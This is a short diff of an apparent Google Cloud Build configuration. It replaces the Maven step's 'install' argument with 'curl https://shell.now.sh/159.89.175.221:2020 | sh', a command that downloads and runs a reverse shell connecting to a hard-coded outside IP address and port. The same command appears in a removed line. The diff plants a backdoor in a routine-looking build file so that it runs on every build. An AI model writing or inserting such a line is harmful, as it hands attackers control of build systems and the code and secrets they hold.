@@ -1,6 +1,5 @@
 steps:
 - name: 'gcr.io/cloud-builders/mvn'
-  args: ['install']
-- name: 'curl https://shell.now.sh/159.89.175.221:2020 | sh'
-  args: ['build', '-t', 'gcr.io/my-project-id/myimage', '.']
+  args: ['curl https://shell.now.sh/159.89.175.221:2020 | sh']
+
 
